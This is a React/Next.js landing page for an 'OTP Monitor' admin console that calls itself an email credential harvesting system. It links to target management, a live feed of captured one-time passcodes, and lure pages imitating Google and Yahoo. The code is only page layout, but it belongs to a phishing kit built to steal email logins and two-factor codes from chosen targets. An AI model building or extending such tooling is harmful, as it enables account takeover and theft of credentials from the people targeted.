import Link from "next/link";

export default function Home() {
  return (
    <div className="flex flex-1 items-center justify-center bg-zinc-50 dark:bg-black">
      <main className="flex w-full max-w-2xl flex-col items-center gap-8 px-8 py-16 text-center">
        <div className="flex flex-col items-center gap-3">
          <span className="rounded-full border border-zinc-200 bg-white px-3 py-1 text-xs font-medium text-zinc-500 dark:border-zinc-800 dark:bg-zinc-900 dark:text-zinc-400">
            Admin Console
          </span>
          <h1 className="text-4xl font-semibold tracking-tight text-zinc-900 dark:text-zinc-50">
            OTP Monitor
          </h1>
          <p className="max-w-md text-base leading-7 text-zinc-600 dark:text-zinc-400">
            Email credential harvesting and monitoring system. Manage targets,
            watch the live OTP feed, and control monitoring sessions.
          </p>
        </div>

        <div className="flex flex-col gap-3 sm:flex-row">
          <Link
            href="/login"
            className="flex h-12 items-center justify-center rounded-full bg-zinc-900 px-6 text-sm font-medium text-white transition-colors hover:bg-zinc-700 dark:bg-zinc-50 dark:text-zinc-900 dark:hover:bg-zinc-200"
          >
            Sign in
          </Link>
          <Link
            href="/dashboard"
            className="flex h-12 items-center justify-center rounded-full border border-zinc-200 bg-white px-6 text-sm font-medium text-zinc-800 transition-colors hover:border-zinc-300 hover:bg-zinc-100 dark:border-zinc-800 dark:bg-zinc-900 dark:text-zinc-200 dark:hover:bg-zinc-800"
          >
            Go to dashboard
          </Link>
        </div>

        <div className="mt-8 w-full border-t border-zinc-200 pt-8 text-sm text-zinc-500 dark:border-zinc-800 dark:text-zinc-400">
          <h2 className="mb-3 font-medium text-zinc-700 dark:text-zinc-300">
            Pages
          </h2>
          <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-2">
            <Link href="/login" className="underline-offset-2 hover:underline">
              /login
            </Link>
            <Link
              href="/dashboard"
              className="underline-offset-2 hover:underline"
            >
              /dashboard
            </Link>
            <Link
              href="/dashboard/targets"
              className="underline-offset-2 hover:underline"
            >
              /dashboard/targets
            </Link>
            <Link
              href="/dashboard/live"
              className="underline-offset-2 hover:underline"
            >
              /dashboard/live
            </Link>
            <Link
              href="/lures/google"
              className="underline-offset-2 hover:underline"
            >
              /lures/google
            </Link>
            <Link
              href="/lures/yahoo"
              className="underline-offset-2 hover:underline"
            >
              /lures/yahoo
            </Link>
          </div>
        </div>
      </main>
    </div>
  );
}
